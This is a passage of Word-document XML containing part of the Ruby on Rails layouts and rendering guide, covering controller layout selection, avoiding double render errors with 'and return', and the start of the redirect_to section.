          <w:p w14:paraId="39F1849A" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  layout nil</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0178E77C" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="165523DE" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>show</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5B4DA861" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    @post</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= Post.find(params[:id])</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4D418770" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="65F5AEF3" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1D458343" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>index</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0EC952CC" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    @old_posts</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= Post.older</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5C7A0B17" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    render :layout</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "old"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="510846EC" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4595B635" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  # ...</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1B7BED5E" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="53CADC7C" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>In this application:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="287964C7" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="69"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">In general, views will be rendered in the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>main</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> layout</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="541BF711" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="69"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>PostsController#index</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> will use the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>main</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> layout</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FE219AC" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="69"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>SpecialPostsController#index</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> will use the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>special</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> layout</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FFFB4CD" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="69"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>OldPostsController#show</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> will use no layout at all</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FC7E3BA" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="69"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>OldPostsController#index</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> will use the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>old</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> layout</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32784CCF" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>2.2.13 Avoiding Double Render Errors</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C276CF4" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Sooner or later, most Rails developers will see the error message “Can only render or redirect once per action”. While this is annoying, it’s relatively easy to fix. Usually it happens because of a fundamental misunderstanding of the way that </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>render</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> works.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F8B989F" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>For example, here’s some code that will trigger this error:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4728"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="43F72F2E" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="496AC648" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>show</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="20458CAD" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  @book</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= Book.find(params[:id])</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="27329E7E" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  if</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@book.special?</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5BF712DA" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    render :action</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "special_show"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="309B0F2F" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="47A25DAF" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  render :action</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "regular_show"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3AF0D3B9" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7CD9E2C8" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>@book.special?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> evaluates to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>true</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, Rails will start the rendering process to dump the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>@book</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> variable into the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>special_show</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> view. But this will </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>not</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> stop the rest of the code in the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>show</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> action from running, and when Rails hits the end of the action, it will start to render the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>regular_show</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> view – and throw an error. The solution is simple: make sure that you have only one call to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>render</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>redirect</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in a single code path. One thing that can help is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>and return</w:t>
      </w:r>
      <w:r>
        <w:t>. Here’s a patched version of the method:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5903"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="0C51FB9B" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4DDE0226" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>show</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5905506F" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  @book</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= Book.find(params[:id])</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3BEB89FE" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  if</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@book.special?</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="56199CAE" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    render :action</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "special_show"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>and</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>return</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2F9C9D06" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2640B28B" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  render :action</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "regular_show"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1B0E3D4A" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="402E13DE" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Make sure to use </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>and return</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> instead of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>&amp;&amp; return</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> because </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>&amp;&amp; return</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> will not work due to the operator precedence in the Ruby Language.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42BD0C15" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Note that the implicit render done by ActionController detects if </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>render</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> has been called, so the following will work without errors:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4728"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="3906A4E5" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="698552B3" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>show</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3AC28B66" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  @book</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= Book.find(params[:id])</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="546A90E2" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  if</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@book.special?</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="17451D39" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    render :action</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "special_show"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="517ED57E" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="09D12F0C" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4EF0AE3F" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This will render a book with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>special?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> set with the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>special_show</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> template, while other books will render with the default </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>show</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> template.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0259848D" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.3 Using </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>redirect_to</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F3ECAA6" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Another way to handle returning responses to an </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>HTTP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> request is with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>redirect_to</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. As you’ve seen, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>render</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> tells Rails which view (or other asset) to use in constructing a response. The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>redirect_to</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method does something completely different: it tells the browser to send a new request for a different </w:t>
      </w:r>
      <w:r>
        <w:rPr>
